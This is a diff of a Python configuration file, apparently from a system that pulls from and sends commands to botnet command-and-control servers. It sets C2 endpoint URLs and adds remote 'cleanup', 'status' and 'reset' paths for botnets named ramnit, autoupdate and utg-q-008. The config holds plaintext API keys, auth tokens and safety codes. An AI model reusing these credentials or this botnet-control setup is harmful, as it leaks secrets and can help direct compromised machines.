@@ -356,7 +356,7 @@ C2_ENDPOINTS = [
     # 示例配置1 - 远程C2服务器
     {
          'name': 'C2-test-remote',
-         'url': os.environ.get('C2_ENDPOINT_1', 'http://150.109.158.175:8888'),  # ⬅️ 改为你的公网IP
+         'url': os.environ.get('C2_ENDPOINT_1', 'http://10.59.157.141:8888'),  # ⬅️ 改为你的公网IP
          'api_key': os.environ.get('C2_API_KEY_1', 'KiypG4zWLXqnREqGPH8L2Oh9ybvi6Yh4'),
          'enabled': True,
          'pull_interval': C2_PULL_INTERVAL_MINUTES * 60,  # 使用统一配置（转换为秒）
@@ -453,4 +453,48 @@ INTERNAL_WORKER_CONFIG = {
     
     # 是否启用内置Worker（通常应与QUEUE_MODE_ENABLED一致）
     'enabled': os.environ.get('INTERNAL_WORKER_ENABLED', 'true').lower() == 'true',
+}
+
+# ============================================================
+# 一键清除接口配置（C2 Remote Cleanup Configuration）
+# ============================================================
+
+# C2远程清除接口认证配置
+C2_CLEANUP_CONFIG = {
+    # 认证令牌（X-Auth-Token header）
+    'auth_token': '3@UNyeExV9HzHeJ!9HG$k4v3FaefwU2RZ%DbgX6wFSTT3^&YqjG&X#*HfT7Y4S5n',
+    
+    # 安全码（X-Safety-Code header）
+    'safety_code': 'Mrcm3YsTNFyJQ685m@bL&nhm!8jyaP&sw9@qz^BJMKkqHh@rzV5GEptkxq9@3Z5e',
+    
+    # C2接口端口
+    'c2_port': 8080,
+    
+    # C2接口路径前缀
+    'c2_path_prefix': '/execute',
+    
+    # 请求超时（秒）
+    'request_timeout': 30,
+    
+    # 是否验证SSL证书（HTTP不需要）
+    'verify_ssl': False,
+    
+    # 僵网操作路径配置（按照文档中的接口路径）
+    'botnet_paths': {
+        'ramnit': {
+            'cleanup': '/admin/ramnit/cleanup',
+            'status': '/admin/ramnit/status',
+            'reset': '/admin/ramnit/reset'
+        },
+        'autoupdate': {
+            'cleanup': '/admin/autoupdate/cleanup',
+            'status': '/admin/autoupdate/status',
+            'reset': '/admin/autoupdate/reset'
+        },
+        'utg-q-008': {
+            'cleanup': '/admin/irc/cleanup',
+            'status': '/admin/irc/status',
+            'reset': '/admin/irc/reset'
+        }
+    }
 }
